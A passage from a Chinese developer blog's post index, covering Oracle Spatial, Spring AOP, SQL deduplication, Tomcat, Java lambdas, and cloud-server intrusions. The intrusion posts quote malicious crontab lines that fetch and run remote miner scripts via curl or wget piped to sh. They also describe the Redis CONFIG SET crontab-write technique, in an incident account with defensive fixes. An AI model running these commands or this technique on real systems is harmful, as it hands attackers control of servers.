Maps、百度地图、高德地图 等在线地图的底层数据采用 WGS84。\n但部分地图（如中国 GCJ-02）会对 WGS84 进行加密偏移。\n\n\nGIS 和空间数据库\nOracle Spatial、PostGIS、ArcGIS 等支持 WGS84 坐标系。\n在 Oracle 中，WGS84 的 SRID（空间参考 ID）通常为：\n4326（标准 WGS84，经纬度顺序：纬度, 经度）\n8307（WGS84，经纬度顺序：经度, 纬度）\n\n\n\n\n\nWGS84 与其他坐标系的区别WGS84 是全通通用的、无偏移的 GPS 原始数据，美国标准。GPS、谷歌地图等使用。GCJ-02 对 WGS84 进行非线性偏移。在中国国内使用，高德地图、腾讯地图等使用。CGCS2000 是中国标准，中国官方测绘。\n\n注：CGCS2000 和 WGS84 在 厘米级精度 下可以视为一致，但在高精度测量（如卫星定位）时需转换。\n\nOracle Spatial 函数（部分）SDO_GEOMETRYSDO_GEOMETRY 是 Oracle Spatial 的核心数据类型，用于存储空间数据。\n基本语法\nSDO_GEOMETRY(    geometry_type  NUMBER,        -- 几何类型代码    srid          NUMBER,        -- 空间参考系ID    point         SDO_POINT_TYPE,-- 点坐标(仅用于点类型)    elem_info     SDO_ELEM_INFO_ARRAY, -- 元素定义数组    ordinates     SDO_ORDINATE_ARRAY   -- 坐标值数组)\n\n几何类型代码\n\n\n\n代码\n类型说明\n\n\n\n2001\n点\n\n\n2002\n线\n\n\n2003\n多边形\n\n\n2005\n多点集合\n\n\n2006\n多线集合\n\n\n2007\n多多边形集合\n\n\n创建点\n-- 创建WGS84坐标系的点(经度120.5，纬度30.2)SELECT SDO_GEOMETRY(    2001,         -- 点类型    8307,         -- WGS84坐标系SRID    SDO_POINT_TYPE(120.5, 30.2, NULL), -- 经度,纬度,高程    NULL,    NULL) FROM dual;\n\n创建线\n-- 创建由三个点组成的线SELECT SDO_GEOMETRY(    2002,  -- 线类型    8307,    NULL,    SDO_ELEM_INFO_ARRAY(1, 2, 1), -- 简单线    SDO_ORDINATE_ARRAY(120,30, 121,31, 122,30) -- 三个点坐标) FROM dual;\n\n创建多边形\n-- 创建四边形(必须闭合)SELECT SDO_GEOMETRY(    2003,  -- 多边形类型    8307,    NULL,    SDO_ELEM_INFO_ARRAY(1, 1003, 1), -- 外多边形    SDO_ORDINATE_ARRAY(120,30, 121,30, 121,31, 120,31, 120,30) -- 闭合坐标) FROM dual;\n\nSDO_WITHIN_DISTANCE 函数详解用于查询在指定距离范围内的空间对象。\n基本语法\nSDO_WITHIN_DISTANCE(    geometry1  SDO_GEOMETRY,  -- 要检查的几何对象    geometry2  SDO_GEOMETRY,  -- 参考几何对象    params     VARCHAR2       -- 距离参数) RETURN VARCHAR2;\n\n参数说明\n\nparams 格式：&#39;distance=&lt;数值&gt; unit=&lt;单位&gt;&#39;\ndistance：距离值\nunit：单位(默认为坐标系单位，WGS84为米)\n\n\n\n查询某点1公里范围内的所有商店\nSELECT s.store_id, s.store_nameFROM stores sWHERE SDO_WITHIN_DISTANCE(    s.location,  -- 商店位置字段    SDO_GEOMETRY(2001, 8307, SDO_POINT_TYPE(120.5, 30.2, NULL), NULL, NULL), -- 中心点    &#x27;distance=1000&#x27;  -- 1公里范围内) = &#x27;TRUE&#x27;;\n\n查询某区域500米内的所有道路\nSELECT r.road_id, r.road_nameFROM roads r, regions regWHERE reg.region_id = 101AND SDO_WITHIN_DISTANCE(    r.geom,      -- 道路几何    reg.geom,    -- 区域几何    &#x27;distance=500&#x27;  -- 500米内) = &#x27;TRUE&#x27;;\n\nSDO_INSIDE用于判断一个几何对象是否完全包含在另一个几何对象内部。\n基本语法\nSDO_INSIDE(    geometry1  SDO_GEOMETRY,  -- 要检查的几何对象    geometry2  SDO_GEOMETRY,  -- 容器几何对象    tol        NUMBER         -- 容差) RETURN VARCHAR2;\n\n查询完全在某个区域内的所有建筑\nSELECT b.building_id, b.building_nameFROM buildings b, city_zones zWHERE z.zone_id = 5AND SDO_INSIDE(    b.geometry,  -- 建筑几何    z.geometry,  -- 区域几何    0.05         -- 容差) = &#x27;TRUE&#x27;;\n\n检查点是否在多边形内\nSELECT     CASE         WHEN SDO_INSIDE(            SDO_GEOMETRY(2001, 8307, SDO_POINT_TYPE(120.3, 30.5, NULL), NULL, NULL),            polygon_geom,            0.01        ) = &#x27;TRUE&#x27; THEN &#x27;Inside&#x27;        ELSE &#x27;Outside&#x27;    END AS position_statusFROM administrative_areasWHERE area_id = 101;\n\n","categories":["编程记录"],"tags":["oracle","经纬度","地图","WGS84坐标系"]},{"title":"private 方法使用 AOP 导致注入属性为 null 的问题","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/private%E6%96%B9%E6%B3%95%E4%BD%BF%E7%94%A8AOP%E5%AF%BC%E8%87%B4%E6%B3%A8%E5%85%A5%E5%B1%9E%E6%80%A7%E4%B8%BAnull%E7%9A%84%E9%97%AE%E9%A2%98/","content":"问题描述项目中使用 aop 实现多数据源切换，如下：\n自定义注解：\n@Target(&#123;ElementType.METHOD, ElementType.TYPE, ElementType.PARAMETER&#125;)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface DataSource &#123;    String value() default &quot;primary&quot;;&#125;\n\naop 方法：\n@Aspect@Configuration@Slf4jpublic class DataSourceAspect &#123;    @Before(&quot;@annotation(dataSource)&quot;)    public void switchDataSource(JoinPoint point, DataSource dataSource) &#123;        String value = dataSource.value();        // 切换数据源        DynamicDataSourceService.switchDb(value);    &#125;    @After(&quot;@annotation(dataSource)&quot;)    public void restDataSource(JoinPoint point, DataSource dataSource) &#123;        // 重置数据源        DynamicDataSourceService.resetDb();    &#125;&#125;\n\n使用：\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;        @PostMapping(&quot;/select&quot;)    @DataSource(&quot;db2&quot;)    public Result&lt;List&lt;Object&gt;&gt; selectCity() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n具体切换方法省略。\n问题代码：\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;        @PostMapping(&quot;/select&quot;)    @DataSource(&quot;db2&quot;)    private Result&lt;List&lt;Object&gt;&gt; selectCity() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n报错：java.lang.NullPointerException         at com.example.controller.TestController.select(TestController.java:48)\n问题分析先定义两个方法，一个 public 一个 private，比较区别。\n@RestController@RequiredArgsConstructor@RequestMapping(&quot;/test&quot;)public class TestController &#123;    private final TestService service;    @PostConstruct    public void init() &#123;        log.info(&quot;service bean:&quot; + service);    &#125;    @PostMapping(&quot;/selectPublic&quot;)    @DataSource(&quot;db2&quot;)    public Result&lt;List&lt;Object&gt;&gt; selectPublic() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;    @PostMapping(&quot;/selectPrivate&quot;)    @DataSource(&quot;db2&quot;)    private Result&lt;List&lt;Object&gt;&gt; selectPrivate() &#123;        List&lt;Object&gt; res = service.selectAll();        return Result.success(res);    &#125;&#125;\n\n启动后，日志：2024-02-04 20:06:26,704 INFO [main] com.example.controller.TestController -&gt; service bean:com.example.service.impl.TestServiceImpl@710ae6a7\n说明 bean 是被正常注入进 spring 容器中的。调用 selectPublic 是可以正常返回的，注入也是正常。调用 selectPrivate 则会报错：java.lang.NullPointerException，service 没有成功注入。\n\n这里的 private 方法是被 AOP 拦截的。普通的 private 方法，如果没有 AOP，bean 的注入是正常的，不会出现 NPE 报错。\n\n在 org.springframework.web.method.support 中 InvocableHandlerMethod 类的 doInvoke 方法上打断点。可以发现，不管是 public 方法还是 private 方法， cglib 创建的代理类中，service 属性为 null。\n但是，当在 AOP 的拦截方法上打断点，可以发现，public 方法是可以停在断点上的，但 private 方法则直接结束，并没有执行 AOP 的方法。所以 private 方法是没有被 AOP 所拦截的。会继续使用代理类，而代理类中的 service 并没有注入，是 null 。从而导致 NPE 报错。\n那么，为什么 public 没有报错呢？想必 AOP 中做了些处理，注入了所需要的 bean。\norg.springframework.aop.framework 的 CglibAopProxy 类中有个内部类 CglibMethodInvocation 如下：\nprivate static class CglibMethodInvocation extends ReflectiveMethodInvocation &#123;    @Nullable    private final MethodProxy methodProxy;    public CglibMethodInvocation(Object proxy, @Nullable Object target, Method method, Object[] arguments, @Nullable Class&lt;?&gt; targetClass, List&lt;Object&gt; interceptorsAndDynamicMethodMatchers, MethodProxy methodProxy) &#123;        super(proxy, target, method, arguments, targetClass, interceptorsAndDynamicMethodMatchers);        this.methodProxy = Modifier.isPublic(method.getModifiers()) &amp;&amp; method.getDeclaringClass() != Object.class &amp;&amp; !AopUtils.isEqualsMethod(method) &amp;&amp; !AopUtils.isHashCodeMethod(method) &amp;&amp; !AopUtils.isToStringMethod(method) ? methodProxy : null;    &#125;    @Nullable    public Object proceed() throws Throwable &#123;        try &#123;            return super.proceed();        &#125; catch (RuntimeException var2) &#123;            throw var2;        &#125; catch (Exception var3) &#123;            if (!ReflectionUtils.declaresException(this.getMethod(), var3.getClass()) &amp;&amp; !KotlinDetector.isKotlinType(this.getMethod().getDeclaringClass())) &#123;                throw new UndeclaredThrowableException(var3);            &#125; else &#123;                throw var3;            &#125;        &#125;    &#125;    protected Object invokeJoinpoint() throws Throwable &#123;        return this.methodProxy != null ? this.methodProxy.invoke(this.target, this.arguments) : super.invokeJoinpoint();    &#125;&#125;\n\nbean 就是在这个代理类中进行注入的。public 方法执行 invoke(this.target, this.arguments)protected 方法执行 super.invokeJoinpoint()\nCglibAopProxy 下执行的时候，上面无论哪个方法都会用实际对象来进行反射调用。而实际对象的 bean 属性值在 spring 启动时便已经注入了。因此代理对象会被重新赋值，即：用实际对象来代替原有的代理对象。\n\nsuper.invokeJoinpoint() 方法主要调用了 method.setAccessible(true); 取消 Java 语言访问检查。\n\n总结private 方法并没有被真正的代理类拦截。虽然代理类 InvocableHandlerMethod 中 private 方法执行了 doInvoke，但是并没有被 CglibAopProxy 拦截。因此 private 方法无法获取被代理目标对象，也就无法获取注入的bean属性。\n解决方法\n把 private 方法改为 public 方法。（不要粗心写错了，指我自己）\n从 ApplicationContext 上下文中直接获取 bean。\n\n参考Java 在Controller层 private修饰的方法导致Service注入为空这一次搞懂Spring代理创建及AOP链式调用过程为什么你写的Controller里，private方法中的bean&#x3D;null？\n","categories":["编程记录"],"tags":["spring","aop","动态代理","cglib"]},{"title":"sql多条件排序并去重","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/sql%E5%A4%9A%E6%9D%A1%E4%BB%B6%E6%8E%92%E5%BA%8F%E5%B9%B6%E5%8E%BB%E9%87%8D/","content":"需求描述首先有一张用户分数表：\n\n然后需要实现一个排行榜的查询：查询某一谱面（chart_id）的排行榜，排序规则为分数降序，时间降序（鼓励用户去挑战理论值，刷新排行榜）并且每个排行榜中每个用户仅出现一次。（去重，防止出现排行榜全是一个人的情况）\n实现过程第一次实现排行榜时，并没有考虑到去重。\nselect user_id,score,create_timefrom user_scorewhere chart_id = 11order by score desc ,create_time desclimit 50\n\n不出意外，如果同一用户打了多次同一铺面，并且分数排名前50，排行榜上便会有多个该用户。发现重复问题是因为拿着查询出来的 user_id 去获取用户信息时，数据的数量对不上。\n随后我陷入了痛苦的思考 sql 过程中。太久没写复杂点的，快忘光了。\n在求助开发组其他四名成员后，也没有结果。因为大家陷入了激烈的讨论中……（23点55分问的，睡前脑力小练习）有一个提议： sql 不好写出来，可以将数据查出来，用代码逻辑处理（遇事不决，业务层拼接）这个方案不到实在写不出来，我不会考虑的。\n然后突然有一个人说：ChatGPT 怎么说这句话，让我的灵魂仿佛得到了神圣的洗涤。还没毕业就要失业了不过不得不说，ChatGPT 强是真的强。在不断的对话引导中，ChatGPT 给出了下面的 sql\nSELECT s.user_id, s.score, s.create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.chart_id = t.chart_id AND s.score = t.max_scoreWHERE s.chart_id = 11ORDER BY s.score DESCLIMIT 50;\n\n当这段代码出来的时候，我的灵魂真的得到了神圣的洗涤。我记起了一个东西 ———— inner join因为是多条件排序，所以 group by 用不了，我甚至找到了 row_number() over () 的用法，但可惜他是 mysql8.0 的函数。服务器 mysql 的版本才5.7.25当然，上面那段代码还是有些许问题的。他的时间没有去重，即同一用户同一分数出现多次，并且上榜，就会重复。（在这里感谢 user_id 为 3177 的用户让我发现了这个 bug，也恭喜他教程这个铺面两次达到理论值（满分））后续对 ChatGPT 的引导中，ChatGPT说他忘了，他甚至可以“忘记”。此时，已是半夜的 2点18分。虽然那个 sql 是 ChatGPT 0点27分给出来的。\n最后在 2点49分，我给出了两次自连接的 sql。但性能不高，只是能用，随后我就眠了。（熬不下去了）\nSELECT s.user_id, s.score, s.create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.chart_id = t.chart_id AND s.score = t.max_score         inner join(select user_id, chart_id, max(create_time) as time                    from user_score                    where chart_id = 11                    group by user_id, chart_id) u                   on s.user_id = u.user_id AND s.chart_id = u.chart_id AND s.create_time = u.timeWHERE s.chart_id = 11ORDER BY s.score DESC, s.create_time DESCLIMIT 50;\n\n然后，另一人给出了一次自连接的 sql，连接越少性能越高。表中当时的数据量在五万左右。查询耗时在 300ms 多一点，下面的 sql 稍快一些 \nSELECT s.user_id, s.score, MAX(s.create_time) AS create_timeFROM user_score s         INNER JOIN (SELECT user_id, chart_id, MAX(score) AS max_score                     FROM user_score                     WHERE chart_id = 11                     GROUP BY user_id, chart_id) t                    ON s.user_id = t.user_id AND s.score = t.max_scoreWHERE s.chart_id = 11GROUP BY user_idORDER BY score DESC, create_time DESCLIMIT 50\n\n此时讨论已经结束，最后一条消息在 3点49分11秒，内容为 该眠了\n时间来到，第二天。关于性能问题，有两个解决方案。\n第一种是缓存查询结果，每小时或者每天更新一次。但是 冲完榜要过一段时间才能看到有点打击人（所以这个方案被放弃了，实现起来也少许有些麻烦。\n第二种是 loading画的炫酷一点就好了这句话，我要裱起来。\n\nloading画的炫酷一点就好了\n\n到此，sql 的编写就结束了。下面来复习下被我忘却的 表连接\n表连接先贴个 SQL 连接(JOIN) | 菜鸟教程\n表连接用于将多个表的行结合起来，有4种连接方式。inner join、full join、left join、right join。\n这个来自菜鸟教程的图是真的好，完美解释了用法：\n\n表连接，算是是一种表的乘法。外连接的话（左连接、右连接、全连接）。根据连接条件，将一条数据变成多个。比如全连接以主键相等为连接条件的话，结果的行数为参与连接的表的行数的乘积。内连接的话（只有内连接）。就是根据连接条件取参与连接的表交集。\n其他的没什么，学过的看到上面类似集合的图就能想起来用法，没学过的可以看看菜鸟的例子便于理解。好吧，这里写的确实挺简洁的。主要是恢复下我的记忆，所以不会太详细。\n","categories":["编程记录"],"tags":["sql"]},{"title":"tomcat请求接口无效字符问题","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/tomcat%E8%AF%B7%E6%B1%82%E6%8E%A5%E5%8F%A3%E6%97%A0%E6%95%88%E5%AD%97%E7%AC%A6%E9%97%AE%E9%A2%98/","content":"场景环境：SpringBoot(2.6.11)内置tomcat(9.0.65)\n在Get请求中含有特殊字符{}时报错，实际场景是请求参数为json格式的数据。\njava.lang.IllegalArgumentException: Invalid character found in the request target [/test/test?id=&#123;&#125; ]. The valid characters are defined in RFC 7230 and RFC 3986\n\n原因tomcat8.0以上版本遵从RFC规范添加了对Url的特殊字符的限制。url中只允许包含：\n\n英文字母(a-zA-Z)\n数字(0-9)\n-_.~四个特殊字符\n保留字符( ! * ’ ( ) ; : @ &amp; &#x3D; + $ , &#x2F; ? # [ ] )一共84个字符。\n\n解决方案降低tomcat版本（不建议）降低版本至7.0.76之前。\n\n逃避不是办法，要直面问题。\n\n添加关于tomcat的配置类@Configurationpublic class TomcatConfig &#123;    @Bean    public TomcatServletWebServerFactory webServerFactory() &#123;        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory();        factory.addConnectorCustomizers((Connector connector) -&gt; &#123;                connector.setProperty(&quot;relaxedPathChars&quot;, &quot;\\&quot;&lt;&gt;[\\\\]^`&#123;|&#125;&quot;);                connector.setProperty(&quot;relaxedQueryChars&quot;, &quot;\\&quot;&lt;&gt;[\\\\]^`&#123;|&#125;&quot;);        &#125;);        return factory;    &#125;&#125;\n\n使用post请求方式(建议)将参数写入请求体内，而不是url。\n出现这个问题的原因是我虽然使用的是post请求，但是参数是没有写在请求体中，而是和get请求一样写在url中。\n","categories":["编程记录"],"tags":["tomcat","bug"]},{"title":"云服日常被攻击（一、二）","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E4%BA%91%E6%9C%8D%E6%97%A5%E5%B8%B8%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%80%E3%80%81%E4%BA%8C%EF%BC%89/","content":"被攻击经历一第一次被攻击是在2022年11月12日，16点39分。手机突然收到了腾讯云的短信，有恶意文件。然后干的第一件事就是从小程序把服务器停了（服务器上没啥重要服务，纯用来练手玩的一些东西后来就是上服务器排查哪出的问题，最后发现是账号密码被爆破了。\n由于大创项目的原因，服务器是三个人一起用的，我给那俩人都创建了账号，权限也都给了。关键的点来了，其中一个账号密码是 123456 ，属于是绷不住了。因为恶意文件的创建者都是那个账号，所以确定是这个账户密码泄露了。\n恶意文件是用于挖矿的 shell 。开机就给我 cpu 干满了，属于是毫不遮掩了。后续就是重装了系统，并且使用强密码。（后面要说，其实用处不大\n还有要说的就是它的攻击方式爆破用户名和密码，挺低级的。不过肯定是用被攻陷的肉鸡去爆破，同时还挖矿，吃满资源。我恨挖矿的，真该死啊\n被攻击经历二第二次被攻击是在2023年12月18日发现的，但是并没有造成影响。这次我的应用是跑在 docker 容器中的。那天发现 redis 里有这几个奇怪的 string。这定时任务显然是有巨大问题的，不是我的程序写进去的。\n*/2 * * * * root cd1 -fsSL http://45.83.123.29/cleanfda/init.sh | sh*/3 * * * * root wget -q -O- http://45.83.123.29/cleanfda/init.sh | sh*/4 * * * * root curl -fsSL http://en2an.top/cleanfda/init.sh | sh*/5 * * * * root wd1 -q -O- http://en2an.top/cleanfda/init.sh | sh\n\n然后去了这些网址看了看都是下载了什么 shell 脚本。一看，好家伙！又是挖矿的。（这群人真该死啊下面这篇文章讲了关于 redis 的安全问题，也包含了我这次被攻击的攻击细节。Databases. EXPOSED! (Redis)\n详细的就去看上面的文章吧。下面简单讲下攻击原理。最开始也是爆破，不过这次爆破的是暴露在公网上的 redis 服务。（建议换个端口，不使用默认的 6379，不过用处不是很大至于为什么会选择 redis ，也许 redis 配置文件的注释就给出了答案。\n# Warning: since Redis is pretty fast an outside user can try up to# 150k passwords per second against a good box. This means that you should# use a very strong password otherwise it will be very easy to break.# 警告：由于Redis速度相当快，外部用户每秒可以在一个好盒子上尝试多达150k个密码。这意味着你应该使用一个非常强的密码，否则很容易被破解。\n所以即便我的密码是强密码 ~Dx33ZWi&gt;}d8LFvwuZKo ，但是丝毫不影响被爆破出来。（只是它花的时间会更久一些。进入 redis 后，会执行 FLUSHALL 删除 redis 服务器上的所有数据。这样做是为了使以下键&#x2F;值的内容尽可能靠近数据库文件的开头写入。然后写入类似上面的键值对 SET backup1 “\\n\\n\\n*&#x2F;4 * * * * root curl -fsSL http://45.83.123.29/cleanfda/init.sh | sh\\n\\n\\n”执行 CONFIG SET dir “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;“ 将 redis 的 data 目录设置为系统的 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;“ 目录，默认目录是 “crond” 进程找到并执行单个用户 crontabs 的目录。执行 CONFIG SET dbfilename “root” 将 redis 的数据文件名设置为 “root”，这意味着数据库的内容将存储在 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root” 中，即 root 用户的个人 crontab 文件。最后执行 save 使 redis 服务器将内存同步到磁盘，如果成功，crontab 进程将读取并执行 “&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root” 的内容。\n到这里，服务器就不属于你了。除了写入定时任务脚本以启动进程，也可以写入 .ssh&#x2F;authorized_keys 文件来添加密钥。\n修复建议如那篇文章所说：\n\nEnable client authentication in your Redis configuration file.在Redis配置文件中启用客户端身份验证。\nConfigure Redis to only run on internal-facing network interfaces.将Redis配置为只在面向内部的网络接口上运行。\nDisable the “CONFIG” command by running ‘rename-command CONFIG “”’ to avoid configuration abuse.通过运行”rename-command CONFIG”禁用”CONFIG”命令，以避免配置滥用。\nConfigure your firewall only to accept Redis connections from trusted hosts.配置防火墙只接受来自可信主机的Redis连接。\n\n最后，挖矿的真该死啊！\n","categories":["编程记录"],"tags":["网络安全","云服务器"]},{"title":"云服日常被攻击（三）","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E4%BA%91%E6%9C%8D%E6%97%A5%E5%B8%B8%E8%A2%AB%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%89%EF%BC%89/","content":"过程又又又被攻击了，这次是通过stp挂在公网的rdp。方便我远程访问家里云。\n起初是看到了v站的一篇帖子：求助，被入侵了，如何减小损失？大致内容就是他通过ftp挂在公网的rdp被入侵了，常用的网站密码都泄露了。\n然后我就想起来，这人的操作和我一样啊。赶紧上服务器看下日志：\n看到日志这么大我就知道坏了，进去翻了一下，基本就是几个ip一直在连接：\n再去翻一下家里云windows的日志：\n基本就是用几个用户名在一直尝试，总共试了三万多次，我看日志的时候还在试是最难绷的。把ftp服务听了之后，想想有什么办法防止这种情况。\nwindows的服务被暴露出来，首先肯定是从windows源头入手，看看有什么办法阻断。看了windows的安全策略，默认多次登陆失败后账户会被锁定10分钟。这个调不调整问题也不大，因为它似乎跑的是字典，连我的用户名都没试出来。（试出来的概率也不大另外就是加ip黑名单，这个不现实。因为ftp服务，所有的请求都是从公网的服务器转发来的。\n但是在服务器的层面加ip黑名单是可以的。bash脚本我就不是很熟了，连夜和gpt一起写了个脚本，检测ftp的日志，把频繁访问的都加到防火墙的ip黑名单里。最后配置个定时任务运行脚本。就完成了。\nbash 脚本#!/bin/bash# 配置参数LOG_FILE=&quot;/home/ubuntu/frp/frps.log&quot;        # 日志文件路径THRESHOLD=100                                # 黑名单阈值BLACKLIST_FILE=&quot;/home/ubuntu/frp/blacklist.txt&quot;  # 黑名单文件路径CHAIN_NAME=&quot;FTP-BLACKLIST&quot;                  # 自定义防火墙链名称LOG_LINES=5000                             # 只处理最近多少行日志# 创建自定义防火墙链（如果不存在）iptables -L $CHAIN_NAME &amp;&gt; /dev/nullif [[ $? -ne 0 ]]; then  echo &quot;创建自定义链: $CHAIN_NAME&quot;  iptables -N $CHAIN_NAME  iptables -I INPUT -j $CHAIN_NAMEfi# 提取日志中的 IP 地址并统计（只读最后 LOG_LINES 行）echo &quot;解析日志文件最后 $LOG_LINES 行：$LOG_FILE&quot;blacklist_ips=$(tail -n &quot;$LOG_LINES&quot; &quot;$LOG_FILE&quot; \\  | grep -oP &#x27;\\b(?:[0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;\\b&#x27; \\  | awk &#x27;&#123;counts[$1]++&#125; END &#123;for (ip in counts) if (counts[ip] &gt; &#x27;&quot;$THRESHOLD&quot;&#x27;) print ip&#125;&#x27;)# 如果没有符合条件的 IP，直接退出if [[ -z &quot;$blacklist_ips&quot; ]]; then  echo &quot;没有超过阈值的 IP&quot;  exit 0fi# 去重并写入黑名单文件echo &quot;更新黑名单文件：$BLACKLIST_FILE&quot;mkdir -p &quot;$(dirname &quot;$BLACKLIST_FILE&quot;)&quot;touch &quot;$BLACKLIST_FILE&quot;for ip in $blacklist_ips; do  if ! grep -q &quot;^$ip$&quot; &quot;$BLACKLIST_FILE&quot;; then    echo &quot;$ip&quot; &gt;&gt; &quot;$BLACKLIST_FILE&quot;  fidone# 获取现有防火墙规则里的 IPexisting_ips=$(iptables -L $CHAIN_NAME -v -n \\  | grep -oP &#x27;\\b(?:[0-9]&#123;1,3&#125;\\.)&#123;3&#125;[0-9]&#123;1,3&#125;\\b&#x27; \\  | sort -u | grep -v &#x27;^0\\.0\\.0\\.0$&#x27;)# 添加新 IP 到防火墙echo &quot;更新防火墙黑名单规则&quot;for ip in $blacklist_ips; do  if echo &quot;$existing_ips&quot; | grep -wq &quot;^$ip$&quot;; then    echo &quot;已存在规则：$ip&quot;  else    echo &quot;添加规则：$ip&quot;    iptables -A $CHAIN_NAME -s &quot;$ip&quot; -j DROP  fidoneecho &quot;防火墙规则更新完成！&quot;\n\n*/10 * * * * bash /home/ubuntu/frp/blacklist.sh &gt;&gt; /home/ubuntu/frp/blacklist.log 2&gt;&amp;1\n\n\n2&gt;&amp;1：将标准错误（stderr）重定向到标准输出，这样标准错误也会被追加到同一个日志文件中。\n\n\n\n\n名称\n代码\n操作符\n\n\n\n标准输入(stdin)\n0\n&lt; 或 &lt;&lt;\n\n\n标准输出(stdout)\n1\n&gt;,&gt;&gt;,1&gt; 或 1&gt;&gt;\n\n\n标准错误输出(stderr)\n2\n2&gt; 或 2&gt;&gt;\n\n\n","categories":["编程记录"],"tags":["网络安全","云服务器","防火墙"]},{"title":"关于使用反射时，因lambda产生的bug","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8E%E4%BD%BF%E7%94%A8%E5%8F%8D%E5%B0%84%E6%97%B6%EF%BC%8C%E5%9B%A0lambda%E4%BA%A7%E7%94%9F%E7%9A%84bug/","content":"场景在做动态权限控制时，需要在项目启动时加载权限列表，写入数据库。以供拦截器去鉴权。这里的权限列表是接口的路径，即权限细到每一个接口。所以，需要使用反射获取接口的路径。然后拦截器通过用户角色获取到权限列表（可访问的接口路径）后，去匹配当前请求的路径。以达到权限控制的目的。\n问题及解决过程前面都很顺利啊，接口路径在项目启动初始化后，成功写入数据库。因为此时的接口是我用 MybatisPlus 的模板生成器生成的，比较简单。当接口查表，处理数据时。有些复杂了，开始使用 lambda 和 stream 流来处理查询结果。（真的很好用兴高采烈的写完，运行项目。初始化权限的地方（通过反射获取接口路径的方法）报了 空指针异常（NPE）。\n这个时候我的第一反应是：我是不是什么地方注解写漏了。因为具体报 NPE 的地方是 @Operation(summary &#x3D; “…”) 注解的 summary 属性。（swagger3 的注解）于是我打印了通过反射获取的方法的路径，因为 controller 层的方法上都有 RequestMapping 之类的注解用来映射请求的路径。我一个 controller 里就增删改查四个方法，打印出来六个，有俩空的。难道还有幽灵方法不成。\n于是打印了路径为空的方法看看。结果如下：\n看到 lambda ，突然就开朗了。最后给 @Operation 做了个空判断，只将有这个注解的方法的路径写入数据库。（文档上没有的，不在权限管理里。也很合理\n关于 lambda 的问题问题解决了，下面就是深入一下为什么。\n其实，很简单。看一下下面的代码和运行结果就知道了。（其实上面打印出来就已经知道了\npublic class Test &#123;    public static void main(String[] args) &#123;        Class&lt;?&gt; cl1 = Lambda.class;        Method[] methods = cl1.getDeclaredMethods();        for (Method method : methods) &#123;            System.out.println(method);        &#125;        System.out.println(&quot;----------------------&quot;);        for (Method method : cl1.getMethods()) &#123;            System.out.println(method);        &#125;    &#125;&#125;class Lambda &#123;    public void lambda1() &#123;        System.out.println(&quot;lambda1 test method&quot;);    &#125;    public void lambda2() &#123;        Runnable lambda2 = () -&gt; System.out.println(&quot;lambda2 test method&quot;);        lambda2.run();·    &#125;&#125;\n\n结果：\npublic void com.xiamo.wowmsbackend.Lambda.lambda2()private static void com.xiamo.wowmsbackend.Lambda.lambda$lambda2$0()public void com.xiamo.wowmsbackend.Lambda.lambda1()----------------------public void com.xiamo.wowmsbackend.Lambda.lambda2()public void com.xiamo.wowmsbackend.Lambda.lambda1()public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedExceptionpublic final void java.lang.Object.wait() throws java.lang.InterruptedExceptionpublic final native void java.lang.Object.wait(long) throws java.lang.InterruptedExceptionpublic boolean java.lang.Object.equals(java.lang.Object)public java.lang.String java.lang.Object.toString()public native int java.lang.Object.hashCode()public final native java.lang.Class java.lang.Object.getClass()public final native void java.lang.Object.notify()public final native void java.lang.Object.notifyAll()进程已结束,退出代码0\n\n可以看出 lambda 是这个类的私有静态方法。（至少编译成 class 之后，是这样的\n详细的反编译结果可以看这篇文章：深入底层原理—带你看透Lambda表达式的本质\nEND反射很好用，但也要注意。做一些判断只拿需要的。lambda 很好用，已经离不开了。（包括 stream 